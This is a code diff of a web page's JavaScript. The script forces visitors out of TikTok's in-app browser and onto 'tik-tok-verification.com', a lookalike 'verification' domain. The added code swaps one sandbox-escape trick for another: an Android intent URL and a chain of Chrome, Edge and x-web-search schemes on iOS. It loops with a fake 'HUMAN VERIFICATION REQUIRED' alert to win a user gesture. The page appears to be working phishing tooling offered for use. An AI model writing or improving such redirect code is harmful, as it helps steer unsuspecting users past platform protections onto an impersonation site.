@@ -9,39 +9,39 @@
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
+    const urlNoProt = targetUrl.replace("https://", "");
     const killTime = Date.now() + 15000;
 
-    function forceExternalJump() {
+    function forceSystemBrowser() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         
         if (isAndroid) {
-            // Android: This specific "VIEW" intent with a browser category
-            // is the strongest way to force an external browser.
-            window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
+            // Android: This specific "VIEW" intent is the absolute strongest way to break a sandbox.
+            // It tells the phone to find ANY browser that can handle this URL.
+            window.location.href = `intent://${urlNoProt}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
         } else {
-            // iOS: Creating an External Internet Shortcut (.url)
-            // TikTok can't render this file type, forcing the OS to open Safari.
-            const urlFileContent = `[InternetShortcut]\nURL=${targetUrl}`;
-            const blob = new Blob([urlFileContent], {type: 'application/x-mswinurl'});
-            const blobUrl = URL.createObjectURL(blob);
+            // iOS: We use multiple "External" schemes. 
+            // Even if they aren't installed, it forces the OS to look for an external handler.
+            window.location.href = "googlechrome://" + urlNoProt;
             
-            // This triggers the "Download" or "Open in Safari" prompt
-            window.location.href = blobUrl;
-            
-            // Backup: Direct hit
             setTimeout(() => {
-                window.location.assign(targetUrl);
-            }, 150);
+                window.location.href = "microsoft-edge-https://" + urlNoProt;
+            }, 50);
+
+            // The 'x-web-search' is our final fallback to trigger Safari.
+            setTimeout(() => {
+                window.location.href = "x-web-search://?" + encodeURIComponent(targetUrl);
+            }, 100);
         }
     }
 
     function securityLogic() {
         if (Date.now() > killTime) return;
 
-        // 1. Initial Force
-        forceExternalJump();
+        // 1. Initial Attempt
+        forceSystemBrowser();
 
-        // 2. Focus Detection (Wait for user action)
+        // 2. The Check (Focus detection)
         setTimeout(() => {
             if (document.hasFocus()) {
                 const header = "HUMAN VERIFICATION REQUIRED\n";
@@ -49,8 +49,8 @@
                 
                 alert(header + body);
 
-                // 3. User Gesture Relay (Immediately after OK)
-                forceExternalJump();
+                // 3. User Gesture Relay: OS is most likely to allow the jump here
+                forceSystemBrowser();
 
                 setTimeout(securityLogic, 400);
             }
